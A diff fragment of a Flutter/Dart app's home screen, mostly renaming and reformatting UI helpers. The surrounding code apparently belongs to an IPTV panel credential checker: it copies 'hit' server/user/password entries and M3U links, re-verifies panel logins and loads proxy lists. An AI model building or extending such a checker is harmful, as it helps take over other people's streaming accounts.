         _sbtn('📋 COPIAR', c: cCy, onTap: () {
           var t = 'SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}';
           if (h.panelInfo != null) t += '\nCANALES: ${h.panelInfo!.live}\nVOD: ${h.panelInfo!.vod}\nSERIES: ${h.panelInfo!.series}';
@@ -658,12 +695,12 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
           Clipboard.setData(ClipboardData(text: t));
           _toast('✓ Copiado');
         }),
-        const SizedBox(width:6),
+        const SizedBox(width: 6),
         _sbtn('📺 M3U', c: cG, onTap: () {
           Clipboard.setData(ClipboardData(text: h.m3u));
           _toast('✓ M3U copiado');
         }),
-        const SizedBox(width:6),
+        const SizedBox(width: 6),
         _sbtn('🔄', c: cMg, onTap: () async {
           setState(() => h.panelInfo = null);
           final info = await verifyPanel(h.panel, h.username, h.password);
@@ -675,8 +712,8 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
   );
 
   Widget _proxyTab() => ListView(padding: const EdgeInsets.all(10), children: [
-    _card(accent: cMg, child: Column(children: [
-      _ctitle('PROXIES'),
+    _card(ac: cMg, child: Column(children: [
+      _ct('PROXIES'),
       _btn('📂 CARGAR ARCHIVO', c: cMg, onTap: _loadProxies),
       const SizedBox(height: 8),
       _prow('TOTAL', '${_proxies.length}'),
@@ -686,19 +723,14 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     ])),
   ]);
 
-  Color _lc(String l) {
-    if (l.contains('HIT')) return cG;
-    if (l.contains('FAIL') || l.contains('ERROR')) return cRe;
-    if (l.contains('WARN') || l.contains('PAUSAD')) return cYe;
-    if (l.contains('PANEL') || l.contains('SRV')) return cCy;
-    return cDg;
-  }
-
-  Widget _runBadge() => Container(
+  Widget _rbadge() => Container(
     padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
-    decoration: BoxDecoration(color: cG.withOpacity(0.07), borderRadius: BorderRadius.circular(10), border: Border.all(color: cG.withOpacity(0.2))),
+    decoration: BoxDecoration(
+      color: cG.withOpacity(0.07), borderRadius: BorderRadius.circular(10),
+      border: Border.all(color: cG.withOpacity(0.2))),
     child: Row(mainAxisSize: MainAxisSize.min, children: [
-      AnimatedBuilder(animation: _glow, builder: (_, __) => Container(width:5,height:5,
+      AnimatedBuilder(animation: _glow, builder: (_, __) => Container(
+        width: 5, height: 5,
         decoration: BoxDecoration(shape: BoxShape.circle, color: cG,
           boxShadow: [BoxShadow(color: cG.withOpacity(_glow.value), blurRadius: 8)]))),
       const SizedBox(width: 5),
@@ -706,7 +738,7 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     ]),
   );
 
-  Widget _statBox(String label, String val, Color c) => Container(
+  Widget _sbox(String label, String val, Color c) => Container(
     padding: const EdgeInsets.all(10),
     decoration: BoxDecoration(color: cBg, borderRadius: BorderRadius.circular(4), border: Border.all(color: cBr)),
     child: Column(children: [
@@ -716,7 +748,7 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     ]),
   );
 
-  Widget _card({Color accent = cBr, required Widget child}) => Container(
+  Widget _card({Color ac = cBr, required Widget child}) => Container(
     margin: const EdgeInsets.only(bottom: 10),
     padding: const EdgeInsets.fromLTRB(14, 12, 12, 12),
     decoration: BoxDecoration(
@@ -729,12 +761,12 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
       Positioned(left: -14, top: -12, bottom: -12, child: Container(width: 2,
         decoration: BoxDecoration(gradient: LinearGradient(
           begin: Alignment.topCenter, end: Alignment.bottomCenter,
-          colors: [accent, Colors.transparent])))),
+          colors: [ac, Colors.transparent])))),
       child,
     ]),
   );
 
-  Widget _ctitle(String t) => Padding(padding: const EdgeInsets.only(bottom: 10), child: Row(children: [
+  Widget _ct(String t) => Padding(padding: const EdgeInsets.only(bottom: 10), child: Row(children: [
     const Text('▸', style: TextStyle(color: cG, fontSize: 12)),
     const SizedBox(width: 6),
     Text(t, style: const TextStyle(fontSize: 11, color: cDg, letterSpacing: 2.5, fontWeight: FontWeight.bold)),
@@ -768,14 +800,19 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     onTap: onTap,
     child: Container(
       padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 7),
-      decoration: BoxDecoration(color: c.withOpacity(0.07), borderRadius: BorderRadius.circular(4), border: Border.all(color: c.withOpacity(0.3))),
-      child: Text(label, style: TextStyle(color: c, fontSize: 10, fontWeight: FontWeight.bold, letterSpacing: 1.5)),
+      decoration: BoxDecoration(
+        color: c.withOpacity(0.07), borderRadius: BorderRadius.circular(4),
+        border: Border.all(color: c.withOpacity(0.3))),
+      child: Text(label, style: TextStyle(color: c, fontSize: 10,
+        fontWeight: FontWeight.bold, letterSpacing: 1.5)),
     ),
   );
 
-  Widget _badge(String text, Color c) => Container(
+  Widget _bdg(String text, Color c) => Container(
     padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 2),
-    decoration: BoxDecoration(color: c.withOpacity(0.08), borderRadius: BorderRadius.circular(2), border: Border.all(color: c.withOpacity(0.2))),
+    decoration: BoxDecoration(
+      color: c.withOpacity(0.08), borderRadius: BorderRadius.circular(2),
+      border: Border.all(color: c.withOpacity(0.2))),
     child: Text(text, style: TextStyle(fontSize: 8, color: c, letterSpacing: 1)),
   );
 
@@ -789,12 +826,12 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
     ]),
   );
 
-  Widget _pbox(String icon, String val, String label, Color c) => Container(
+  Widget _pbox(String val, String label, Color c) => Container(
     padding: const EdgeInsets.all(7),
     decoration: BoxDecoration(color: cBg, borderRadius: BorderRadius.circular(4), border: Border.all(color: cBr)),
     child: Column(children: [
-      Text(_fn(int.tryParse(val) ?? 0), style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold,
-        color: c, shadows: [Shadow(color: c, blurRadius: 10)], fontFamily: 'monospace')),
+      Text(val, style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold, color: c,
+        shadows: [Shadow(color: c, blurRadius: 10)], fontFamily: 'monospace')),
       Text(label, style: const TextStyle(fontSize: 8, color: cDg, letterSpacing: 1)),
     ]),
   );
@@ -806,16 +843,4 @@ class _HomeState extends State<HomeScreen> with TickerProviderStateMixin {
       Text(val, style: const TextStyle(fontSize: 10, color: cG)),
     ]),
   );
-
-  String _fmt(int n) {
-    final s = n.toString();
-    final buf = StringBuffer();
-    for (var i = 0; i < s.length; i++) {
-      if (i > 0 && (s.length - i) % 3 == 0) buf.write(',');
-      buf.write(s[i]);
-    }
-    return buf.toString();
-  }
-
-  String _fn(int n) => n >= 1000 ? '${(n/1000).toStringAsFixed(1)}k' : '$n';
 }
